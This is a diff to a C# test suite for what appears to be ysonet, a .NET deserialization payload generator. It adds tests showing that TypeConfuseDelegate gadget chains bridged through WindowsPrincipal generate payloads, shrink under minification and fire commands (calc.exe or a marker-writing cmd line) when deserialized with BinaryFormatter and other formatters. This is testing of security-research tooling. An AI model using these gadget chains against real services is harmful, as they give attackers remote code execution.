@@ -143,6 +143,7 @@ namespace ysonet.Tests
                 Run("Output encodings correct per formatter (representative gadgets)", OutputEncodingPerFormatter);
                 Run("Bridged gadget chains (--bgc) generate for every consumer", BridgedChainsGenerate);
                 Run("Bridged chains propagate --minify to the whole chain (raw vs min)", BridgedChainsMinifyPropagates);
+                Run("WindowsPrincipal bridge generates, minifies, and fires for every formatter", WindowsPrincipalBridgeEveryFormatter);
                 Run("Every plugin mode/CVE/inner-gadget generates (x minify)", PluginFullMatrixGenerates);
             }
 
@@ -3271,8 +3272,8 @@ namespace ysonet.Tests
         // ---- 6.6 bridged gadget chains (--bgc) ----
 
         // The --bgc mechanism is otherwise untested. Every consumer tagged Bridged with
-        // a real SupportedBridgedFormatter() must generate a chain leaf,consumer; the two
-        // known non-consumers must be rejected; and one chain must fire end to end.
+        // a real SupportedBridgedFormatter() must generate a chain leaf,consumer; a
+        // non-Bridged gadget must be rejected; and chains must fire end to end.
         private static void BridgedChainsGenerate()
         {
             var failures = new List<string>();
@@ -3283,7 +3284,7 @@ namespace ysonet.Tests
                 IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                 if (g == null || !g.Labels().Contains(GadgetTags.Bridged)) continue;
                 string bridgedFmt = g.SupportedBridgedFormatter();
-                if (string.IsNullOrEmpty(bridgedFmt)) continue; // e.g. WindowsPrincipal reports None
+                if (string.IsNullOrEmpty(bridgedFmt)) continue; // skip any bridge that declares no formatter (none currently)
 
                 consumers++;
                 // The leaf must produce the consumer's expected bridged formatter.
@@ -3304,12 +3305,12 @@ namespace ysonet.Tests
                     failures.Add(leaf + "," + name + " -f " + finalFmt + " -> " + (r.Success ? "empty" : r.ErrorMessage));
             }
 
-            AssertTrue(consumers >= 13, "found the bridged consumers (was " + consumers + ")");
+            AssertTrue(consumers >= 14, "found the bridged consumers (was " + consumers + ")");
             AssertTrue(failures.Count == 0,
                 "bridged chains failed (" + failures.Count + "):\n  " + string.Join("\n  ", failures.ToArray()));
 
-            // WindowsPrincipal is Bridged-labelled but declares no bridged formatter (None),
-            // so it must be rejected as a bridge consumer.
+            // WindowsPrincipal now declares a real bridged formatter (BinaryFormatter), so it
+            // must be a valid bridge consumer (regression: it used to report None and be rejected).
             RunResult wp = PayloadRunner.GenerateGadget(new GenerationRequest
             {
                 GadgetName = "WindowsPrincipal",
@@ -3318,9 +3319,9 @@ namespace ysonet.Tests
                 OutputFormat = "",
                 InputArgs = CalcInput(),
             });
-            AssertTrue(!wp.Success, "WindowsPrincipal is rejected as a bridge consumer (no bridged formatter)");
+            AssertTrue(wp.Success && !RawIsEmpty(wp.Raw), "WindowsPrincipal accepts a bridged chain: " + wp.ErrorMessage);
 
-            // DataSetOldBehaviourFromFile is not tagged Bridged, so it must be rejected too.
+            // DataSetOldBehaviourFromFile is not tagged Bridged, so it must be rejected.
             RunResult dsff = PayloadRunner.GenerateGadget(new GenerationRequest
             {
                 GadgetName = "DataSetOldBehaviourFromFile",
@@ -3357,6 +3358,35 @@ namespace ysonet.Tests
             {
                 if (File.Exists(marker)) File.Delete(marker);
             }
+
+            // The newly bridged consumer must ALSO fire end to end, not just generate:
+            // TypeConfuseDelegate wrapped in WindowsPrincipal, via BinaryFormatter. This
+            // proves the bridged BF blob reaches and fires from the inner ClaimsIdentity's
+            // bootstrapContext, the whole point of making WindowsPrincipal a bridge.
+            string wpMarker = Path.Combine(Path.GetTempPath(), "ysonet_bgc_wp_fire.txt");
+            if (File.Exists(wpMarker)) File.Delete(wpMarker);
+            try
+            {
+                InputArgs fa = new InputArgs();
+                fa.Cmd = "cmd /c echo x > \"" + wpMarker + "\"";
+                fa.IsRawCmd = true;
+                fa.Test = false;
+                RunResult fr = PayloadRunner.GenerateGadget(new GenerationRequest
+                {
+                    GadgetName = "WindowsPrincipal",
+                    BridgedGadgetChain = "TypeConfuseDelegate",
+                    FormatterName = "BinaryFormatter",
+                    OutputFormat = "",
+                    InputArgs = fa,
+                });
+                AssertTrue(fr.Success && fr.Raw is byte[], "WindowsPrincipal bridged chain generated for firing: " + fr.ErrorMessage);
+                RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])fr.Raw); });
+                AssertTrue(WaitForFile(wpMarker, 2500), "the bridged chain TypeConfuseDelegate,WindowsPrincipal fired end to end");
+            }
+            finally
+            {
+                if (File.Exists(wpMarker)) File.Delete(wpMarker);
+            }
         }
 
         // Minify must propagate THROUGH a bridged gadget chain. PayloadRunner shares one InputArgs
@@ -3378,7 +3408,7 @@ namespace ysonet.Tests
                 IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                 if (g == null || !g.Labels().Contains(GadgetTags.Bridged)) continue;
                 string bridgedFmt = g.SupportedBridgedFormatter();
-                if (string.IsNullOrEmpty(bridgedFmt)) continue; // e.g. WindowsPrincipal reports None
+                if (string.IsNullOrEmpty(bridgedFmt)) continue; // skip any bridge that declares no formatter (none currently)
 
                 consumers++;
                 string leaf = bridgedFmt.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)
@@ -3396,7 +3426,7 @@ namespace ysonet.Tests
                 else shrank++;
             }
 
-            AssertTrue(consumers >= 13, "found the bridged consumers (was " + consumers + ")");
+            AssertTrue(consumers >= 14, "found the bridged consumers (was " + consumers + ")");
             AssertTrue(broken.Count == 0,
                 "bridged chains failed or grew under --minify (" + broken.Count + "):\n  " + string.Join("\n  ", broken.ToArray()));
             AssertTrue(noEffect.Count == 0,
@@ -3446,6 +3476,108 @@ namespace ysonet.Tests
                 AssertTrue(r.Success && r.Raw is byte[], "bridged chain generated (minify=" + minify + "): " + r.ErrorMessage);
                 RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])r.Raw); });
                 AssertTrue(WaitForFile(marker, 2500), "bridged TypeConfuseDelegate,AxHostState fired (minify=" + minify + ")");
+            }
+            finally { SafeDelete(marker); }
+        }
+
+        // WindowsPrincipal is newly bridge-capable, and it advertises SEVEN output formatters.
+        // The generic bgc sweep only exercises a consumer's first formatter, so this proves the
+        // bridge for EVERY WindowsPrincipal formatter on three axes:
+        //   1) it generates a non-empty payload (Test=false),
+        //   2) --minify still reaches the whole chain (the minified payload is strictly smaller
+        //      than the raw one - the bridged BF blob shrinks with loose type names and the
+        //      consumer embeds that smaller blob; equal size would mean --minify never arrived),
+        //   3) it actually FIRES the bridged blob end to end, minify off AND on.
+        // Firing reuses the gadget's own Test=true self-test (which deserializes with that
+        // formatter's own helper) on an STA thread. Nothing is skipped: a formatter that does not
+        // generate, shrink, or fire is a real failure, not an ignored case.
+        private static void WindowsPrincipalBridgeEveryFormatter()
+        {
+            IGenerator wp = GadgetRegistry.CreateGadgetInstance("WindowsPrincipal");
+            AssertTrue(wp != null && wp.Labels().Contains(GadgetTags.Bridged)
+                && wp.SupportedBridgedFormatter() == "BinaryFormatter",
+                "WindowsPrincipal is a BinaryFormatter bridge consumer");
+
+            var genFail = new List<string>();
+            var minFail = new List<string>();
+            var fireFail = new List<string>();
+            int formatters = 0;
+            foreach (string f in wp.SupportedFormatters())
+            {
+                string fmt = f.Split(' ')[0];
+                formatters++;
+
+                // 1) Generation, minify off and on (Test=false): both must produce bytes/text.
+                RunResult raw = GenWindowsPrincipalBridge(fmt, false);
+                RunResult min = GenWindowsPrincipalBridge(fmt, true);
+                if (!raw.Success || RawIsEmpty(raw.Raw)) { genFail.Add(fmt + " -> raw " + (raw.Success ? "empty" : raw.ErrorMessage)); continue; }
+                if (!min.Success || RawIsEmpty(min.Raw)) { genFail.Add(fmt + " -> min " + (min.Success ? "empty" : min.ErrorMessage)); continue; }
+
+                // 2) --minify must reach the chain: the minified output is strictly smaller.
+                int rl = RawLength(raw.Raw), ml = RawLength(min.Raw);
+                if (ml >= rl) minFail.Add(fmt + " -> --minify had no effect (min=" + ml + " >= raw=" + rl + ")");
+
+                // 3) Fire the whole bridged chain, minify off and on.
+                foreach (bool minify in new[] { false, true })
+                {
+                    if (!FiresWindowsPrincipalBridge(fmt, minify))
+                        fireFail.Add(fmt + (minify ? " (minified)" : ""));
+                }
+            }
+
+            AssertTrue(formatters >= 7, "WindowsPrincipal advertises its formatters (was " + formatters + ")");
+            AssertTrue(genFail.Count == 0,
+                "WindowsPrincipal bridged generation failed (" + genFail.Count + "):\n  " + string.Join("\n  ", genFail.ToArray()));
+            AssertTrue(minFail.Count == 0,
+                "WindowsPrincipal bridged --minify did not propagate (" + minFail.Count + "):\n  " + string.Join("\n  ", minFail.ToArray()));
+            AssertTrue(fireFail.Count == 0,
+                "WindowsPrincipal bridged chain did not fire (" + fireFail.Count + "):\n  " + string.Join("\n  ", fireFail.ToArray()));
+        }
+
+        // Generate TypeConfuseDelegate,WindowsPrincipal for one formatter (Test=false), with the
+        // given minify flag, and return the raw RunResult for size comparison.
+        private static RunResult GenWindowsPrincipalBridge(string formatter, bool minify)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "calc.exe";
+            ia.Test = false;
+            ia.Minify = minify;
+            return PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = "WindowsPrincipal",
+                BridgedGadgetChain = "TypeConfuseDelegate",
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+        }
+
+        // Generate TypeConfuseDelegate,WindowsPrincipal for one formatter with Test=true so the
+        // gadget's own self-test deserializes and fires it in-process (STA), and report whether
+        // the marker was written. Returns false if it did not fire.
+        private static bool FiresWindowsPrincipalBridge(string formatter, bool minify)
+        {
+            string marker = MarkerPath("bgc_wp_" + formatter.Replace('.', '_') + (minify ? "_m" : "_n"));
+            SafeDelete(marker);
+            try
+            {
+                InputArgs ia = new InputArgs();
+                ia.Cmd = MarkerCommand(marker);
+                ia.IsRawCmd = true;
+                ia.Test = true; // the last gadget in the chain self-tests: it deserializes + fires
+                ia.Minify = minify;
+                RunSTA(delegate
+                {
+                    PayloadRunner.GenerateGadget(new GenerationRequest
+                    {
+                        GadgetName = "WindowsPrincipal",
+                        BridgedGadgetChain = "TypeConfuseDelegate",
+                        FormatterName = formatter,
+                        OutputFormat = "",
+                        InputArgs = ia,
+                    });
+                });
+                return WaitForFile(marker, 3000);
             }
             finally { SafeDelete(marker); }
         }
